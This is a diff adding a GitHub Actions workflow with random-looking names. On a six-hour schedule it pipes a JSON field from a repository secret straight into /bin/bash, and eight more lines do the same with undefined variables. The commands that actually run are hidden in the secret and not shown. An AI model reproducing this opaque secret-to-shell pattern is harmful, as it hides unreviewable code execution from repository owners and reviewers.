@@ -1,0 +1,25 @@
+name: chenglidanshun
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '5 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: chenglidanshun
+        env:
+          ythde3726: ${{ secrets.ythde3726 }}
+        run: |
+          echo $ythde3726 | jq -r .i85511 | /bin/bash
+          echo $yol1657 | jq -r .tqdnb51515 | /bin/bash
+          echo $h9 | jq -r .maqa684 | /bin/bash
+          echo $m0783 | jq -r .i23481 | /bin/bash
+          echo $gzp59626 | jq -r .cu77266 | /bin/bash
+          echo $dzaqk652 | jq -r .wl0 | /bin/bash
+          echo $tm57 | jq -r .k2914 | /bin/bash
+          echo $s44 | jq -r .tj565 | /bin/bash
+          echo $ykouu60070 | jq -r .v61 | /bin/bash
+
